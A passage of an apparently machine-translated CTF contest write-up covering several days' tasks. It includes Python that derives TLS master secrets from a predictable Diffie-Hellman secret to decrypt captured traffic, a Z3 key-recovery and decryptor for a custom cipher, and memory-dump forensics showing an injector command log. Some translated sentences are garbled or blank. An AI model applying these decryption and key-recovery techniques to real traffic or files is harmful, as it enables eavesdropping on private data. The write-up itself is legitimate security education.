2**4096 + 2**4095 + 2**4081 + 2**4069 + 1 CMP = 2**4096 state *= 2 if state &gt; CMP: state ^= XOR</code> </pre> <br><p> 长数字的机密向左移动1位，如果最高有效位为1，则该数字的常数为5个非零位（XOR）。 </p><br></li></ol><br><p> 查看pcap，我发现从服务器到达的Diffie-Hellman参数是恒定的： </p><br><pre> <code class="plaintext hljs">dh_g = 2 dh_p =</code> </pre> <br><p> 并且每次建立连接时，客户端都会发送其Diffie-Hellman机密的公共部分。 通过比较相邻会话的秘密的公开部分，您可以还原客户端的初始秘密，然后恢复每个会话的所有后续秘密： <br> 如果秘密的最高位为0，则在下一个会话中，秘密将简单地大2倍，并且公共部分将以p为模的平方。 因此，有可能恢复初始机密（从/ dev / urandom中读取的内容）以p为模： </p><br><pre><code class="plaintext hljs">212030266574081313400816495535550771039880390539286135828101869037345869420205997453325815053364595553160004790759435995827592517178474188665111332189420650868610567156950459495593726196692754969821860322110444674367830706684288723400924718718744572072716445007789955072532338996543460287499773137785071615174311774659549109541904654568673143709587184128220277471318155757799759470829597214195494764332668485009525031739326801550115807698375007112649770412032760122054527000645191827995252649714951346955180619834783531787411998600610075175494746953236628125613177997145650859163985984159468674854699901927080143977813208682753148280937687469933353788992176066206254339449062166596095349440088429291135673308334245804375230115095159172312975679432750163246936266603077314220813042048063033927345613565227184333091534551071824033535159483541175958867122974738255966511008607723675431569961127852005437047813822454112416864211120323016008267853722731311026233323235121922969702016337164336853826598082855592007126727352041124911221048498141841625765390204460725231581416991152769176243658310857769293168120450725070030636638954553866903537931113666283836250525318798622872347839391197939468295124060629961250708172499966110406527347</code></pre><br><p> 从中很容易计算出所有其他会话的秘密。 </p><br><p> 这里有问题： <br>  A）Wireshark知道Diffie-Hellman的秘密，就无法解密SSL，并且没有现成的解决方案。 我们需要计算Diffie-Hellman（又称预掌握密钥会话）的共同秘密，并使用它来使用大型自行车找到主密钥会话（我认为SSL中没有自行车）。 接下来，您可以制作一个SSLKEYLOG文件，在其中随机写入客户端（在每个ssl会话中）和主密钥，并在WireShark设置中指定SSL解密并从理论上获利。 </p><br><p> 但是又出现了一些问题： <br>  B）PHP被认为太慢了（不使用<code>bcadd</code> ， <code>bcpowmod</code>函数...），我决定用python重写它。 <br>  C）找不到以人为形式的通过预主密钥计算主密钥的公式，ssl很难理解，我也无法得到openssl来输出中间计算的结果。 结果，我使用了<a href="">以下代码</a> ， <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">描述</a>和某种RFC： <br><img src="https://habrastorage.org/webt/hl/ko/q6/hlkoq67uttadwf0spe68fvvgtgo.png"></p><br><p> 结果，经过半天，我得以覆盖了这一点（对我来说，没有自行车是不可能的）： </p><br><pre> <code class="plaintext hljs">for i in xrange(0, 4264): dh_secret = pow(srv_pubkeys[i], state, dh_p) dh_secret = hex(dh_secret)[2:-1] if len(dh_secret) % 2 : dh_secret = "0"+dh_secret while dh_secret[0:2] == "00": dh_secret = dh_secret[2:] dh_secret = dh_secret.decode("hex") seed = "master secret"+(cl_random[i].strip() + srv_random[i].strip()).decode("hex") A = seed master_key = "" for j in xrange(0, 2): A = hmac.new(dh_secret, A, hashlib.sha256).digest() master_key += hmac.new(dh_secret, A+seed, hashlib.sha256).digest() master_key = master_key[0:48].encode("hex") print "CLIENT_RANDOM " + cl_random[i].strip() + " " + master_key state *= 2 if state &gt; CMP: state ^= XOR</code> </pre> <br><p>  D）为了剥夺各种客户端的随机性，...从Wireshark会话中导出到csv，并搜索csv作为“ ...”得到的原始流量。 </p><br><p>  E）为了解密4264个会话，WireShark决定吃掉许多GB的操作员（对于他来说，这还不够8），但是什么也没做，您可以在功能强大的计算机上运行所有内容，而不能在性能较弱的笔记本电脑上运行。 但是，在导出http对象（图片的解密片段）时，WireShark只能保存前1000个文件，然后其编号结束。 结果，我不得不将pcap分成每个1000 tcp会话的5个部分。 粘贴所有片段后，结果是一幅如此美丽的图画： </p><br><p><img src="https://habrastorage.org/webt/kn/op/xh/knopxh0nebqck4xuix2kvgmoyju.png"></p></div></div><br><p> 获胜者用于解决任务的所有文件都可以在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">此处</a>找到。 </p><br><h2> 第五天，保护壳 </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center"> 优胜者 </td></tr><tr><td align="center">  <b>第一名</b> </td><td align="center">  <b>第二名</b> </td><td align="center">  <b>第三名</b> </td></tr><tr><td align="center"> 沃斯 </td><td align="center"> 半月 </td><td align="center"> 克洛 </td></tr><tr><td colspan="3" align="center"> 还决定了：Maxim Pronin，0x3c3e，tinkerlock，demidov_al，x @ secator，groke_in_the_sky，d3fl4t3 </td></tr></tbody></table></div><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">RuCTFE</a>准备的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">任务</a> 。 为参与者提供了具有多种反调试技术的模糊可执行文件。 可执行文件就像连接到先前已知服务器的SSH客户端一样。 任务是了解此文件的算法，以便在服务器上执行命令。 作者的解决方案涉及绕过反调试和分析混淆。 </p><br><p> 值得注意的是，最快的参与者以不同于作者计划的原始方式解决了任务，此后他找到了另一种解决方法。 您可以在下面的扰流板下看到他的操作方式。 </p><br><div class="spoiler">  <b class="spoiler_title">第五天任务解决方案选项（VOS）</b> <div class="spoiler_text"><iframe width="560" height="315" src="https://www.youtube.com/embed/rpq5R9wnoiM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/00xBulNZkGI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></div></div><br><h2> 第六天。解锁 </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center"> 优胜者 </td></tr><tr><td align="center">  <b>第一名</b> </td><td align="center">  <b>第二名</b> </td><td align="center">  <b>第三名</b> </td></tr><tr><td align="center">  Godaswag </td><td align="center">  medidrdrider </td><td align="center"> 系统 </td></tr></tbody></table></div><br><p> 第六天的任务是由<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">VolgaCTF</a>团队准备的。 给定一个实现自定义加密算法的可执行文件。 任务是在没有已知密钥的情况下解密使用该算法加密的条件中给出的文件。 </p><br><div class="spoiler">  <b class="spoiler_title">第六天任务解决方案（gotdaswag）</b> <div class="spoiler_text"><h3 id="intro"> 简介 </h3><br><p> 给定一个包含两个文件的归档文件： <strong>locker</strong>和<strong>secret.png.enc</strong> 。 </p><br><p> 第一个文件是Linux x86-64的<strong>ELF</strong> ，它接收文件和加密密钥作为输入，第二个文件是加密的<strong>PNG</strong>图像。 </p><br><pre> <code class="plaintext hljs"># ./locker Required option 'input' missing Usage: ./locker [options] Options: -i, --input in.png Input file path -o, --output out.png.enc Output file path -k, --key 0004081516234200 Encryption key in hex -h, --help Print this help menu</code> </pre> <br><h3 id="locker"> 储物柜 </h3><br><p> 在分析了IDA中的文件之后，我们在<strong>项目:: main</strong>函数中找到了加密算法。 </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/0a3/e68/c77/0a3e68c773b0ff4a7c4d09a321deecd1.png"></p><br><p> 经过研究，我们知道这是一个<strong>块密码</strong> （ECB），块大小为<strong>32位</strong> ，密钥大小为<strong>64位</strong> ，轮数为<strong>77</strong> 。 </p><br><h5 id="versiya-na-python">  Python版本 </h5><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">encrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(p, k, rounds=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">77</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, rounds): n = (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">1</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">26</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xE0</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">22</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0x10</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">13</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">8</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">4</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">2</span></span> x = p ^ k x ^= p &gt;&gt; <span class="hljs-number"><span class="hljs-number">12</span></span> x ^= p &gt;&gt; <span class="hljs-number"><span class="hljs-number">20</span></span> x &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> y = <span class="hljs-number"><span class="hljs-number">1</span></span> &lt;&lt; n y &amp;= <span class="hljs-number"><span class="hljs-number">0xBB880F0FC30F0000</span></span> y &gt;&gt;= n y &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> x == y: p &amp;= <span class="hljs-number"><span class="hljs-number">0xFFFFFFFE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: p |= <span class="hljs-number"><span class="hljs-number">1</span></span> k = ror(k, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) p = ror(p, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> p</code> </pre> <br><h3 id="secret-key"> 秘钥 </h3><br><p> 我们知道加密文件是<strong>PNG</strong>图片。 <br> 因此，我们知道了<strong>几个</strong>文件头形式<strong>的明文密文</strong> （PNG的标准格式）。 <br><img src="https://habrastorage.org/getpro/habr/post_images/0b7/ecb/770/0b7ecb770732ca1fdc9f8cba8f0d8248.png"></p><br><p> 让我们尝试简单的方法，并使用<strong>SMT求解器</strong> （ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" title="Z3">Z3</a> ）查找加密密钥。 <br> 为此，请稍微修改代码，然后将一对明文-密文提交给输入。 </p><br><h5 id="task6_keypy">  task6_key.py </h5><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> z3 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-comment"><span class="hljs-comment"># PNG file signature (8 bytes) + IHDR chunk header (8 bytes) PLAIN_TEXT = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52' BLOCK_SIZE = 4 def encrypt(p, k, rounds=77): for i in range(0, rounds): n = LShR(p, 4) &amp; 1 n |= LShR(p, 26) &amp; 0xE0 n |= LShR(p, 22) &amp; 0x10 n |= LShR(p, 13) &amp; 8 n |= LShR(p, 7) &amp; 4 n |= LShR(p, 4) &amp; 2 x = k ^ ZeroExt(32, p) x ^= LShR(ZeroExt(32, p), 12) x ^= LShR(ZeroExt(32, p), 20) x &amp;= 1 y = 1 &lt;&lt; ZeroExt(32, n) y &amp;= 0xBB880F0FC30F0000 y = LShR(y, ZeroExt(32, n)) y &amp;= 1 p = If(x == y, p &amp; 0xFFFFFFFE, p | 1) p = RotateRight(p, 1) k = RotateRight(k, 1) return p def qword_le_to_be(v): pv = struct.pack('&lt;Q', v) uv = struct.unpack('&gt;Q', pv) return uv[0] if len(sys.argv) &lt; 2: sys.exit('no input file specified') with open(sys.argv[1], 'rb') as encrypted_file: k = BitVec('k', 64) key = k solver = Solver() for i in range(0, len(PLAIN_TEXT), BLOCK_SIZE): # prepare plain text and cipher text pairs pt = struct.unpack('&lt;L', PLAIN_TEXT[i:i + BLOCK_SIZE])[0] ct = struct.unpack('&lt;L', encrypted_file.read(BLOCK_SIZE))[0] p = BitVecVal(pt, 32) e = BitVecVal(ct, 32) solver.add(encrypt(p, k) == e) print('solving ...') if solver.check() == sat: encryption_key = solver.model()[key].as_long() print('key: %016X' % qword_le_to_be(encryption_key))</span></span></code> </pre> <br><p> 解决方案： </p><br><pre> <code class="plaintext hljs">&gt; python task6_key.py "secret.png.enc" solving ... key: AE34C511A8238BCC</code> </pre> <br><h3 id="unlocker"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 解锁者 </font></font></h3><br><p>          . <br>                  . </p><br><h5 id="task6_unlockerpy"> task6_unlocker.py </h5><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> binascii BLOCK_SIZE = <span class="hljs-number"><span class="hljs-number">4</span></span> ror = <span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> val, r_bits, max_bits: \ ((val &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) &gt;&gt; r_bits%max_bits) | \ (val &lt;&lt; (max_bits-(r_bits%max_bits)) &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) rol = <span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> val, r_bits, max_bits: \ (val &lt;&lt; r_bits%max_bits) &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>) | \ ((val &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) &gt;&gt; (max_bits-(r_bits%max_bits))) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(e, k, rounds=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">77</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> dk = ror(k, <span class="hljs-number"><span class="hljs-number">13</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, rounds): dk = rol(dk, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) e = rol(e, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>) n = (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">1</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">26</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xE0</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">22</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0x10</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">13</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">8</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">4</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">2</span></span> x = e ^ dk x ^= e &gt;&gt; <span class="hljs-number"><span class="hljs-number">12</span></span> x ^= e &gt;&gt; <span class="hljs-number"><span class="hljs-number">20</span></span> x &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> y = <span class="hljs-number"><span class="hljs-number">1</span></span> &lt;&lt; n y &amp;= <span class="hljs-number"><span class="hljs-number">0xBB880F0FC30F0000</span></span> y &gt;&gt;= n y &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> x == y: e &amp;= <span class="hljs-number"><span class="hljs-number">0xFFFFFFFE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: e |= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">2</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no input file specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">3</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no output file specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">4</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no encryption key specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: key = binascii.unhexlify(sys.argv[<span class="hljs-number"><span class="hljs-number">3</span></span>]) key = struct.unpack(<span class="hljs-string"><span class="hljs-string">'&lt;Q'</span></span>, key)[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'non-hexadecimal encryption key'</span></span>) print(<span class="hljs-string"><span class="hljs-string">'unlocking ...'</span></span>) start_time = time.time() <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(sys.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>], <span class="hljs-string"><span class="hljs-string">'rb'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> ef: <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(sys.argv[<span class="hljs-number"><span class="hljs-number">2</span></span>], <span class="hljs-string"><span class="hljs-string">'wb'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> df: <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>: ct = ef.read(BLOCK_SIZE) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> ct: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> ct = struct.unpack(<span class="hljs-string"><span class="hljs-string">'&lt;L'</span></span>, ct)[<span class="hljs-number"><span class="hljs-number">0</span></span>] pt = decrypt(ct, key) pt = struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;L'</span></span>, pt) df.write(pt) print(<span class="hljs-string"><span class="hljs-string">'done, took %.3f seconds.'</span></span> % (time.time() - start_time))</code> </pre> <br><p>  ,         . </p><br><pre> <code class="plaintext hljs">&gt; python task6_unlocker.py "secret.png.enc" "secret.png" "AE34C511A8238BCC" unlocking ... done, took 49.669 seconds.</code> </pre> <br><h5 id="secretpng"> secret.png </h5><br><p><img src="https://habrastorage.org/getpro/habr/post_images/9fa/18b/2b2/9fa18b2b2264379bd89ebcaaf62c3006.png"></p><br><blockquote> ZN{RA$T0GR@PHY_H3RTS} </blockquote></div></div><br><h2> Day 7. Beep Beep! </h2><br><div class="scrollable-table"><table><tbody><tr><td align="center">  </td></tr><tr><td align="center"> <b>1 </b> </td></tr><tr><td align="center"> sysenter </td></tr></tbody></table></div><br><p>     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">SchoolCTF</a> .     ,    ,  .   ,       ,      . </p><br><div class="spoiler"> <b class="spoiler_title">    (sysenter)</b> <div class="spoiler_text"><p> Something that looks like VirtualBox RAM dump is provided to us. </p><br><p> We can try volatility, but it seems that it unable to locate required structures to restore Virtual Memory layout. </p><br><p><img src="https://habrastorage.org/webt/go/1l/7i/go1l7imiojbikday6awhxdrbw58.png"></p><br><p> No process memory for us today, so we will have to work with fragmented memory. </p><br><p> First of all let's precache strings from the dump. </p><br><pre> <code class="plaintext hljs">strings &gt; strings_ascii.txt strings -el &gt; strings_wide.txt</code> </pre> <br><p> Most interesting one is command execution log: </p><br><pre> <code class="plaintext hljs">cd .. .\injector.exe 192.168.1.65 .\run.exe .\storage cd .\server\ .\run.exe block1 .\run.exe block0 cd Z:\zn_2019\ cd .\server\ cd .. .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd .. touch echo echo qwe echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ injector.exe 1921.68.1.65 injector.exe 192.68.1.65 ./injector.exe 192.68.1.65 .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\server\ run storage .\run.exe .\storage cd Z:\zn_2019\server\ .\run.exe block1 cd Z:\zn_2019\server\ .\run.exe block0 cd .. .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\Injector2.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 .\injector2.exe 192.168.1.65 cd Z:\zn_2019\ .\Injector2.exe 192.168.1.65 '.\ConsoleApplication5 (2).exe' 192.168.1.65</code> </pre> <br><p> <strong>Not Important note:</strong> </p><br><p> <em>Not sure what <strong>SIGN.MEDIA</strong> is, but it looks like a cached file list from VirtualBox Network Share (Is this from Windows Registry?).</em> </p><br><pre> <code class="plaintext hljs">SIGN.MEDIA=138A400 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=138A400 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=138A400 zn_2019\Injector2.exe SIGN.MEDIA=138A400 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=138A400 zn_2019\NOTE1.exe SIGN.MEDIA=138A400 zn_2019\NOTE1.exe SIGN.MEDIA=138A400 zn_2019\With_little_debug.exe SIGN.MEDIA=138A400 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=138A400 zn_2019\injector.exe SIGN.MEDIA=138A400 zn_2019\nnnn.exe SIGN.MEDIA=138A400 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=138A400 zn_2019\note.exe SIGN.MEDIA=138A400 zn_2019\note2.exe SIGN.MEDIA=138A400 zn_2019\note3.exe SIGN.MEDIA=138A400 zn_2019\note4.exe SIGN.MEDIA=138A400 zn_2019\random.exe SIGN.MEDIA=138A400 zn_2019\z.exe SIGN.MEDIA=17582C zn_2019\Injector2.exe SIGN.MEDIA=17582C zn_2019\injector.exe SIGN.MEDIA=196C2 zn_2019\server\run.exe SIGN.MEDIA=1C176B0 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C176B0 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C176B0 zn_2019\Injector2.exe SIGN.MEDIA=1C176B0 zn_2019\injector.exe SIGN.MEDIA=1C176B0 zn_2019\note.exe SIGN.MEDIA=1C176B0 zn_2019\note2.exe SIGN.MEDIA=1C176B0 zn_2019\note3.exe SIGN.MEDIA=1C1D02C zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C1D02C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C1D02C zn_2019\Injector2.exe SIGN.MEDIA=1C1D02C zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C1D02C zn_2019\With_little_debug.exe SIGN.MEDIA=1C1D02C zn_2019\injector.exe SIGN.MEDIA=1C1D02C zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C1D02C zn_2019\note.exe SIGN.MEDIA=1C1D02C zn_2019\note2.exe SIGN.MEDIA=1C1D02C zn_2019\note3.exe SIGN.MEDIA=1C1DAB0 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C1DAB0 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C1DAB0 zn_2019\Injector2.exe SIGN.MEDIA=1C1DAB0 zn_2019\With_little_debug.exe SIGN.MEDIA=1C1DAB0 zn_2019\injector.exe SIGN.MEDIA=1C1DAB0 zn_2019\note.exe SIGN.MEDIA=1C1DAB0 zn_2019\note2.exe SIGN.MEDIA=1C1DAB0 zn_2019\note3.exe SIGN.MEDIA=1C30058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C30058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C30058 zn_2019\Injector2.exe SIGN.MEDIA=1C30058 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C30058 zn_2019\With_little_debug.exe SIGN.MEDIA=1C30058 zn_2019\injector.exe SIGN.MEDIA=1C30058 zn_2019\injector.exe SIGN.MEDIA=1C30058 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C30058 zn_2019\note.exe SIGN.MEDIA=1C30058 zn_2019\note2.exe SIGN.MEDIA=1C30058 zn_2019\note3.exe SIGN.MEDIA=1C89400 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C89400 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C89400 zn_2019\Injector2.exe SIGN.MEDIA=1C89400 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C89400 zn_2019\NOTE1.exe SIGN.MEDIA=1C89400 zn_2019\With_little_debug.exe SIGN.MEDIA=1C89400 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=1C89400 zn_2019\injector.exe SIGN.MEDIA=1C89400 zn_2019\nnnn.exe SIGN.MEDIA=1C89400 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C89400 zn_2019\note.exe SIGN.MEDIA=1C89400 zn_2019\note.exe SIGN.MEDIA=1C89400 zn_2019\note2.exe SIGN.MEDIA=1C89400 zn_2019\note3.exe SIGN.MEDIA=1C89400 zn_2019\note4.exe SIGN.MEDIA=1C8A800 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C8A800 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C8A800 zn_2019\Injector2.exe SIGN.MEDIA=1C8A800 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C8A800 zn_2019\NOTE1.exe SIGN.MEDIA=1C8A800 zn_2019\With_little_debug.exe SIGN.MEDIA=1C8A800 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=1C8A800 zn_2019\injector.exe SIGN.MEDIA=1C8A800 zn_2019\nnnn.exe SIGN.MEDIA=1C8A800 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C8A800 zn_2019\note.exe SIGN.MEDIA=1C8A800 zn_2019\note2.exe SIGN.MEDIA=1C8A800 zn_2019\note3.exe SIGN.MEDIA=1C8A800 zn_2019\note4.exe SIGN.MEDIA=2D702C zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=3EDC2 zn_2019\server\a.exe SIGN.MEDIA=3EDC2 zn_2019\server\hui.exe SIGN.MEDIA=3EDC2 zn_2019\server\run.exe SIGN.MEDIA=4482C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=4482C zn_2019\PEview.exe SIGN.MEDIA=5B0058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=5B0058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=5B0058 zn_2019\Injector2.exe SIGN.MEDIA=5B0058 zn_2019\injector.exe SIGN.MEDIA=5B0058 zn_2019\note.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Discord.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Far.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\FileZillaFTPclient.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\InputDirector.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\KeePass.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\PicPick.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Skype.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\UpdateManager.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\VBoxManager.exe 